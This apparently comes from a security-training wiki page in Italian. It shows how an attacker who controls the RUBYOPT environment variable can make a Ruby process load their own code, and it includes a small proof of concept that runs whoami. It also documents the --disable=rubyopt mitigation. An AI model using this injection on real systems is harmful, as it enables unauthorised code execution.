# Injection nelle applicazioni Ruby

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Ruby analizza gli switch da riga di comando supportati dalla variabile d'ambiente `RUBYOPT` prima di eseguire uno script. Sebbene Ruby rifiuti alcuni switch in questo contesto, `-I` può anteporre una directory di ricerca delle librerie e `-r` può richiedere una libreria. Pertanto, un processo che avvia Ruby con variabili d'ambiente controllate dall'attaccante può essere indotto a caricare codice Ruby controllato dall'attaccante.<sup>[[1]](#references)</sup>

Create `/tmp/inject.rb`:
```ruby:inject.rb
puts `whoami`
```
Crea uno script Ruby innocuo come `hello.rb`:
```ruby:hello.rb
puts 'Hello, World!'
```
Eseguilo con un valore `RUBYOPT` controllato:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Per disabilitare questo comportamento, passa `--disable=rubyopt` (o `--disable-rubyopt`) **prima** del nome dello script:<sup>[[1]](#references)</sup>
```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```
Un'opzione scritta dopo `hello.rb` viene passata allo script in `ARGV`; non disabilita l'elaborazione precedente di `RUBYOPT` da parte di Ruby.<sup>[[1]](#references)</sup>

## References

- [1] [Documentazione di Ruby - Opzioni della riga di comando di Ruby](https://ruby-doc.org/3.4/ruby/options_md.html)
{{#include ../../../banners/hacktricks-training.md}}
